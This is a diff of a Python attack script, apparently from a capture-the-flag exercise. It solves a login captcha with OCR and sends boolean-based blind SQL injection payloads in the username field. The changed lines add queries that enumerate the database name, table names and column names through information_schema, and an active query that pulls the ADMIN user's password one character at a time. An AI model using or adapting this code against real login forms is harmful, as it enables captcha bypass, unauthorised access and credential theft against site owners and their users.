@@ -22,7 +22,12 @@ def compare(index, comp, character):
 		filename = 'test.jpg'
 		Image.open(fileGIF).convert('RGB').save(filename)
 		captcha = pytesseract.image_to_string(Image.open(filename), config='-psm 8 -c tessedit_char_whitelist=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')
-		query = "' or ord(substr(database(),%d,1)) %s ord('%s') -- -" % (index, comp, character)
+		
+		#query = "' or substr(database(),%d,1) %s '%s' -- -" % (index, comp, character)
+		#query = "' or (select substr(group_concat(table_name),%d,1) from information_schema.tables where table_schema = 'web1') %s '%s' -- -" % (index, comp, character)
+		#query = "' or (select substr(group_concat(column_name),%d,1) from information_schema.columns where table_name = 'us3r') %s '%s' -- -" % (index, comp, character)
+		
+		query = "' or (select ord(substr(password,%d,1)) from us3r where usernam3 = 'ADMIN') %s ord('%s')-- -" % (index, comp, character)
 		datas = {'username': query, 'password': 'password', 'captcha': captcha}
 		r = session.post(url, data = datas)
 		print 'error: ' + str(r.text.find('Error') == -1) + ' captcha: ' + str(r.text.find('Sai Captcha') == -1)
